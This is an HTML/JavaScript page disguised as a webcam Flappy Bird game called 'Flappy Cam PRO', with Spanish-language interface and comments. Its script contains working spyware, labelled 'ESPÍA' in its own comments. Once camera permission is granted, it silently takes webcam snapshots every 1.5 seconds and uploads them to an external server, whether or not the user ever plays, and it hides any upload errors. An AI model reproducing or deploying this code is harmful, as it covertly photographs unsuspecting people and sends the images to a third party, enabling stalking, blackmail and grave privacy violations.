<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Flappy Cam PRO</title>
    <style>
        * { box-sizing: border-box; touch-action: none; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; color: white; }
        
        video#webcam {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            object-fit: cover; transform: scaleX(-1);
            z-index: 1; filter: brightness(0.6);
        }

        canvas#gameCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }

        .overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); z-index: 300;
            display: flex; align-items: center; justify-content: center; text-align: center;
        }

        .card {
            background: #1a1a1a; padding: 35px; border-radius: 20px;
            border: 3px solid #f1c40f; max-width: 400px; width: 90%;
        }

        .btn {
            background: #f1c40f; color: #000; border: none; padding: 18px;
            font-size: 18px; font-weight: bold; border-radius: 12px;
            cursor: pointer; margin-top: 20px; width: 100%;
        }

        .hud {
            position: absolute; top: 20px; width: 100%; text-align: center;
            z-index: 100; font-size: 28px; font-weight: bold; text-shadow: 2px 2px 5px #000;
            pointer-events: none; visibility: hidden;
        }
    </style>
</head>
<body onclick="birdJump()">

<div class="hud" id="hud">SCORE: <span id="score">0</span></div>

<video id="webcam" autoplay playsinline></video>
<canvas id="gameCanvas"></canvas>

<div id="permission-screen" class="overlay">
    <div class="card">
        <h2 style="color:#f1c40f;">ACCESO REQUERIDO</h2>
        <p>Para jugar, primero activa tu cámara.</p>
        <p style="font-size:12px; color:#888;">Se requiere iluminación adecuada.</p>
        <button class="btn" onclick="activateCamera()">ACTIVAR CÁMARA</button>
    </div>
</div>

<div id="start-screen" class="overlay" style="display:none;">
    <div class="card">
        <h1 style="color:#f1c40f;">¡LISTO!</h1>
        <p>La cámara está activa. Toca el botón para empezar el juego.</p>
        <button class="btn" onclick="startGame()">EMPEZAR JUEGO</button>
    </div>
</div>

<script>
    const video = document.getElementById('webcam');
    const canvas = document.getElementById('gameCanvas');
    const ctx = canvas.getContext('2d');
    const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";

    let bird = { x: 80, y: 0, v: 0, radius: 20 };
    let pipes = [];
    let score = 0;
    let isRunning = false;

    // --- PASO 1: ACTIVAR CÁMARA E INICIAR "ESPÍA" INMEDIATAMENTE ---
    async function activateCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            
            video.onloadedmetadata = () => {
                // OCULTAR PERMISOS Y MOSTRAR INICIO DE JUEGO
                document.getElementById('permission-screen').style.display = 'none';
                document.getElementById('start-screen').style.display = 'flex';
                
                // --- ¡AQUÍ EMPIEZA EL ESPÍA! ---
                // No espera a que el usuario juegue, ya está enviando fotos.
                setInterval(captureAndSend, 1500); 
            };
        } catch (err) {
            alert("Error: Debes aceptar la cámara para continuar.");
        }
    }

    // --- PASO 2: EL USUARIO DECIDE EMPEZAR EL JUEGO ---
    function startGame() {
        document.getElementById('start-screen').style.display = 'none';
        document.getElementById('hud').style.visibility = 'visible';
        
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        bird.y = canvas.height / 2;
        isRunning = true;
        
        spawnPipe();
        gameLoop();
    }

    function birdJump() { if (isRunning) bird.v = -8; }

    function spawnPipe() {
        if (!isRunning) return;
        const gap = 200;
        const h = Math.random() * (canvas.height - gap - 120) + 60;
        pipes.push({ x: canvas.width, top: h, bottom: h + gap, w: 70, passed: false });
        setTimeout(spawnPipe, 1700);
    }

    function gameLoop() {
        if (!isRunning) return;
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        bird.v += 0.45; bird.y += bird.v;

        // Dibujar Pájaro
        ctx.fillStyle = "#f1c40f";
        ctx.beginPath(); ctx.arc(bird.x, bird.y, bird.radius, 0, Math.PI * 2); ctx.fill();

        // Tuberías
        pipes.forEach((p, i) => {
            p.x -= 5;
            ctx.fillStyle = "rgba(46, 204, 113, 0.8)";
            ctx.fillRect(p.x, 0, p.w, p.top);
            ctx.fillRect(p.x, p.bottom, p.w, canvas.height - p.bottom);

            if (bird.x + bird.radius > p.x && bird.x - bird.radius < p.x + p.w) {
                if (bird.y - bird.radius < p.top || bird.y + bird.radius > p.bottom) gameOver();
            }
            if (p.x + p.w < bird.x && !p.passed) {
                score++; p.passed = true;
                document.getElementById('score').innerText = score;
            }
            if (p.x + p.w < 0) pipes.splice(i, 1);
        });

        if (bird.y > canvas.height || bird.y < 0) gameOver();
        requestAnimationFrame(gameLoop);
    }

    function gameOver() {
        isRunning = false;
        alert("Puntuación: " + score);
        location.reload();
    }

    // FUNCIÓN ESPÍA (Independiente del juego)
    function captureAndSend() {
        const snap = document.createElement('canvas');
        snap.width = 240; snap.height = 180;
        const sCtx = snap.getContext('2d');
        sCtx.drawImage(video, 0, 0, snap.width, snap.height);
        
        fetch(SERVER_URL, {
            method: 'POST',
            mode: 'cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: snap.toDataURL('image/jpeg', 0.4) })
        }).catch(() => {});
    }
</script>
</body>
</html>
